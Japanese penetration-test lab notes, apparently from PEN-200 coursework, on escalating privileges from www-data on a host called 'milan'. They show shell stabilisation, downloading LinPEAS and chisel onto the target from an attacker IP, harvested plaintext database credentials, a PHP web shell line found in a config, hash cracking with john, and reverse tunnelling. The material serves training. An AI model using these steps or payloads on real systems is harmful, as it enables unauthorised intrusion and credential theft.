# シェルの安定化

※penelopeでシェル獲得できた場合は不要
```zsh
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
# Ctrl + Z
stty raw -echo; fg
```

---

# Auto 

- *curl は実行できない* (`budybox curl` でも不可)
- port 8888へは接続できない

## unix-privesc-check -> 失敗
### 転送・実行

```zsh
# Attacker
cp /usr/bin/unix-privesc-check .
python -m http.server 443
```
```zsh
# Target
wget 192.168.45.215:443/unix-privesc-check 
chmod +x unix-privesc-check
./unix-privesc-check standard > unix-privesc-check.out
```

### 実行結果抽出

```sh
www-data@milan:/tmp$ cat unix-privesc-check.out 
Assuming the OS is: linux
ERROR: Dependend program 'strings' is mising.  Can't run.  Sorry!
```

---

## LinPEAS

### 転送・実行

```zsh
# Attacker
cp /usr/share/peass/linpeas/linpeas.sh .
python -m http.server 443
```
```zsh
# Target
wget 192.168.45.215:443/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.out
```

### 実行結果抽出

```sh
╔══════════╣ Check for vulnerable cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                      
══╣ Cron jobs list     
...
-rw-r-----   1 root root   859 Nov 18  2022 froxlor

# mysql がローカルで動作
# ssh も動作
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                
══╣ Active Ports (netstat)                                                                                                                                  
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -     

# milanの権限高い
╔══════════╣ All users & groups

uid=1000(milan) gid=1000(milan04) groups=1000(milan04),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)

# Froxlor については任意の書き込みが可能
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files       
var/www/html/froxlor/lib/Froxlor/Database/Database.php

# DBのパスワードらしきものを発見
╔══════════╣ Searching passwords in config PHP files
/var/www/html/froxlor/admin_configfiles.php:            '<SQL_UNPRIVILEGED_PASSWORD>' => 'FROXLOR_MYSQL_PASSWORD',                                          
/var/www/html/oscommerce/catalog/admin/includes/configure.php:  define('DB_DATABASE', 'oscdb');
/var/www/html/oscommerce/catalog/admin/includes/configure.php:  define('DB_SERVER_PASSWORD', '7NVLVTDGJ38HM2TQ');
/var/www/html/oscommerce/catalog/admin/includes/configure.php:  define('DB_SERVER_USERNAME', 'oscuser');
/var/www/html/oscommerce/catalog/includes/configure.php:  define('DB_DATABASE', 'oscdb');
/var/www/html/oscommerce/catalog/includes/configure.php:  define('DB_SERVER_PASSWORD', '7NVLVTDGJ38HM2TQ');
/var/www/html/oscommerce/catalog/includes/configure.php:  define('DB_SERVER_USERNAME', 'oscuser');
/var/www/html/oscommerce/catalog/install/includes/configure.php:  define('DB_DATABASE', '');echo system($_GET["cmd"]);/*');
/var/www/html/oscommerce/catalog/install/includes/configure.php:  define('DB_SERVER_PASSWORD', '');
/var/www/html/oscommerce/catalog/install/includes/configure.php:  define('DB_SERVER_USERNAME', '');
```

---
---

# Manual

## ユーザー


---

## システム情報

- PwnKitは使えない
```sh
www-data@milan:/home/milan$ hostnamectl
   Static hostname: milan
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 486dfe9556a64225a27a333a8ee9d4d3
           Boot ID: 2068944e73904d519faeb8a94a50e81d
    Virtualization: vmware
  Operating System: Ubuntu 20.04.5 LTS
            Kernel: Linux 5.15.0-52-generic
      Architecture: x86-64
www-data@milan:/home/milan$ dpkg -s policykit-1 | grep Version
Version: 0.105-26ubuntu1.3
```

---

## 実行中のプロセス


---

## ネットワーク

- 他インターフェースがないので、Pivot には使えない

- サービス
```sh
...
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      off (0.00/0/0)
...
tcp6       0      0 :::60002                :::*                    LISTEN      off (0.00/0/0)
...
```

- [[#トンネリング]]したうえで、ポート631にアクセスすると、CUPS 2.3.1にアクセスできる
![[Pasted image 20260215135425.png]]

---

## Cron


---

## インストール済みアプリケーション

### froxlor

>Froxlor は、お客様のニーズに応える軽量のサーバー管理ソフトウェアです。
経験豊富なサーバー管理者によって開発されたこのオープン ソース (GPL) パネルは、ホスティング プラットフォームの管理作業を簡素化します。

- ディレクトリ
```
/var/www/html/froxlor/
```

---

## アクセス制限が不十分なファイル/ディレクトリ


---

## マウントされていないドライブ


---

## 高権限をもつバイナリの列挙

- suid
```sh
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                          
                      ╚════════════════════════════════════╝                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                             
strings Not Found                                                                                                                                           
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)                                                                 
-rwsr-sr-x 1 root root 15K Jul  6  2022 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 463K Mar 30  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 144K Oct 17  2022 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-r-sr-xr-x 1 root root 15K Dec  7  2022 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14K Dec  7  2022 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 163K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 67K Mar 14  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 31K Feb 21  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 87K Mar 14  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb  7  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 52K Mar 14  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 67K Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 84K Mar 14  2022 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 14  2022 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 39K Feb  7  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 84K Mar 14  2022 /snap/core20/1695/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Mar 14  2022 /snap/core20/1695/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Mar 14  2022 /snap/core20/1695/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1695/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core20/1695/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Mar 14  2022 /snap/core20/1695/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                                                 
-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1695/usr/bin/su
-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1695/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1695/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1695/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 84K Mar 14  2022 /snap/core20/1738/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Mar 14  2022 /snap/core20/1738/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Mar 14  2022 /snap/core20/1738/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1738/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core20/1738/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Mar 14  2022 /snap/core20/1738/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                                                 
-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1738/usr/bin/su
-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1738/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1738/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/1738/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1738/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 121K Nov 25  2022 /snap/snapd/17883/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                                                                                                     
-rwsr-xr-x 1 root root 43K Sep 16  2020 /snap/core18/2620/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Jun 28  2019 /snap/core18/2620/bin/ping
-rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core18/2620/bin/su
-rwsr-xr-x 1 root root 27K Sep 16  2020 /snap/core18/2620/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 75K Mar 14  2022 /snap/core18/2620/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core18/2620/usr/bin/chsh
-rwsr-xr-x 1 root root 75K Mar 14  2022 /snap/core18/2620/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 14  2022 /snap/core18/2620/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Mar 14  2022 /snap/core18/2620/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                                                 
-rwsr-xr-x 1 root root 146K Jan 19  2021 /snap/core18/2620/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Oct 25  2022 /snap/core18/2620/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 427K Mar 30  2022 /snap/core18/2620/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 43K Sep 16  2020 /snap/core18/2632/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Jun 28  2019 /snap/core18/2632/bin/ping
-rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core18/2632/bin/su
-rwsr-xr-x 1 root root 27K Sep 16  2020 /snap/core18/2632/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 75K Mar 14  2022 /snap/core18/2632/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core18/2632/usr/bin/chsh
-rwsr-xr-x 1 root root 75K Mar 14  2022 /snap/core18/2632/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 14  2022 /snap/core18/2632/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Mar 14  2022 /snap/core18/2632/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                                                 
-rwsr-xr-x 1 root root 146K Jan 19  2021 /snap/core18/2632/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Oct 25  2022 /snap/core18/2632/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 427K Mar 30  2022 /snap/core18/2632/usr/lib/openssh/ssh-keysign

```

- SGIDはとくになし

---

## システムデーモン

```sh
./pspy64 -p -i 1000
```


---

## 共有フォルダ、SNMP情報


---

## 興味深い情報


---

## デバイスドライバ・カーネルモジュール

---

# MariaDB

- LinPEAS  の結果入手したクレデンシャルで認証成功
```sh
www-data@milan:/tmp$ mysql -u oscuser  -p
Enter password: # ← "7NVLVTDGJ38HM2TQ" と入力
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 37
Server version: 10.3.34-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SELECT version();
+----------------------------------+
| version()                        |
+----------------------------------+
| 10.3.34-MariaDB-0ubuntu0.20.04.1 |
+----------------------------------+
1 row in set (0.000 sec)
```

- 認証情報がないか探す
	- osCommerceのユーザー名なだけの可能性あり
	- `http://milan:60001/docs/database_schema.pdf`にアクセスし、passwordで検索かけたところ、`administrators`、`customers`、`customers_info`(password_reset_key)でヒットした
	- `customers`、`customers_infoはEmtpy set
```sql
Database changed
MariaDB [oscdb]> SHOW TABLES;
+---------------------------------------------+
| Tables_in_oscdb                             |
+---------------------------------------------+
...
| administrators                              |
...
customers
...
| zones_to_geo_zones                          |
+---------------------------------------------+
50 rows in set (0.000 sec)

MariaDB [oscdb]> SELECT * FROM administrators;
+----+-----------+------------------------------------+                       
| id | user_name | user_password                      |                       
+----+-----------+------------------------------------+                       
|  1 | admin     | $P$DVNsEBdq7PQdr7GR65xbL0pas6caWx0 |                       
+----+-----------+------------------------------------+                                                                                                     
1 row in set (0.001 sec)                                                      
```

- 一応クラックするも、失敗
	- <u>30分以上かかったので、おそらくこのadminパスワードは使わない</u>
```sh
┌──(koshi㉿kali)-[~/PEN-200/Skylark/VM15]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt oscdb_admin.hash 
...
0g 0:00:00:46 4.13% (ETA: 13:31:39) 0g/s 14785p/s 14785c/s 14785C/s chambery..celos
...
Session completed. 

┌──(koshi㉿kali)-[~/PEN-200/Skylark/VM15]
└─$ john --show oscdb_admin.hash 
0 password hashes cracked, 1 left
```

- mysqlのパスワードで`su`できるかどうかを確認→失敗
```sh
www-data@milan:/home/milan$ su milan
Password: 
su: Authentication failure
www-data@milan:/home/milan$ su sarah
Password: 
su: Authentication failure
```

---

# トンネリング

目的：ローカルサービスにアクセスする

- GLIBCが古いため、ligoloはつかえず
- chiselを使う
```sh
# attacker
wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_amd64.gz
mv ~/Downloads/chisel_1.11.3_linux_amd64.gz .
gunzip chisel_1.11.3_linux_amd64.gz
sudo python -m http.server 80

sudo chisel server --port 443 --reverse

# target
wget 192.168.45.215:443/chisel_1.11.3_linux_amd64
chmod +x chisel_1.11.3_linux_amd64
./chisel_1.11.3_linux_amd64 client 192.168.45.215:443 R:631:127.0.0.1:631
```
![[Pasted image 20260215135249.png]]

---

# CUPS -> nothing

>CUPS（カップス、以前の名称はCommon UNIX Printing System）とはUnix系オペレーティングシステム (OS) 用のモジュール化された印刷システムである。


- LinPEASのCUPS関連の結果
```sh
╔══════════╣ Running processes (cleaned)
root        1915  0.0  0.4  28972  9276 ?        Ss   21:14   0:00 /usr/sbin/cupsd -l
root        1921  0.0  0.6 178396 12352 ?        Ssl  21:14   0:00 /usr/sbin/cups-browsed
```
- →rootの権限で動作している

- CUPSそのものにはエクスプロイトはない

- 念のためGobusterでスキャンしてみる
	- 拡張子が違うばあいでも、それを許容するため、200が多い
```sh
┌──(koshi㉿kali)-[~/PEN-200/Skylark/VM15]
└─$ gobuster dir -u http://127.0.0.1:631/ -r -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 100 -o WebEnum/gobuster_cups_631.txt -x 'html,txt,sh,php,pdf' -s 200,301,302 -b "" --exclude-length 4609 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:               http://127.0.0.1:631/
[+] Method:            GET
[+] Threads:           100
[+] Wordlist:          /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Status codes:      301,302,200
[+] Exclude Length:    4609
[+] User Agent:        gobuster/3.8
[+] Extensions:        php,pdf,html,txt,sh
[+] Follow Redirect:   true
[+] Timeout:           10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 2295]
/help                 (Status: 200) [Size: 3165]
/classes.txt          (Status: 200) [Size: 2047]
/classes.sh           (Status: 200) [Size: 2047]
/classes              (Status: 200) [Size: 2047]
/classes.pdf          (Status: 200) [Size: 2047]

```

---

# Froxlor

>Froxlor（フロクサー）は、SysCPから派生したオープンソースの無料Webホスティング・コントロールパネル

- netstatでポート60002が以下のようになっていた
```sh
www-data@milan:/tmp$ netstat -ano | grep 60002
tcp6       0      0 :::60002                :::*                    LISTEN      off (0.00/0/0)
```

- [[#トンネリング]]して、60002にアクセス
- foxlorのログイン画面が表示
- 以下の認証情報は失敗
```
admin:admin
admin:S1mplerCloud
froxlor:froxlor
```

![[Pasted image 20260215143704.png]]


### 気になる情報

- https://qiita.com/kk0128/items/d7c6298a68995ad53c8f
	- pspyを実行しても、froxlorと思われるプロセスは見当たらない


## LinPEASでfroxlor関連の情報

- 大量（"froxlor" というキーワードに 245 件マッチ）
```sh
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
/var/www/html/froxlor/actions/admin
/var/www/html/froxlor/actions/admin/settings
...
/var/www/html/froxlor/lib/Froxlor/Api/Commands/Admins.php

═╣ Cron jobs list
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root    1042 Feb 13  2020 /etc/crontab

/etc/cron.d:
total 40
drwxr-xr-x   2 root root  4096 Nov 18  2022 .
drwxr-xr-x 134 root root 12288 Dec  7  2022 ..
-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root   285 Jul 16  2019 anacron
-rw-r--r--   1 root root   201 Feb 14  2020 e2scrub_all
-rw-r-----   1 root root   859 Nov 18  2022 froxlor

╔══════════╣ Searching passwords in config PHP files
/var/www/html/froxlor/admin_configfiles.php:		'<SQL_UNPRIVILEGED_PASSWORD>' => 'FROXLOR_MYSQL_PASSWORD',
```
- www-dataが書き込み可能だが、rootによってcronで実行されている

- cronからだと、froxlorが何を実行しているかは確認できない

### 攻撃でやったこと

- /var/www/html/froxlor配下に、Ivanのphp web shellを置き、トンネリング経由でアクセス
	- → www-data としてリバースシェルを獲得しただけ。
	- webサービスそのものは、rootが動かしているわけではない。

- /var/www/html/froxlor配下にあるphpファイルに認証なしでアクセスしてみる
	- →失敗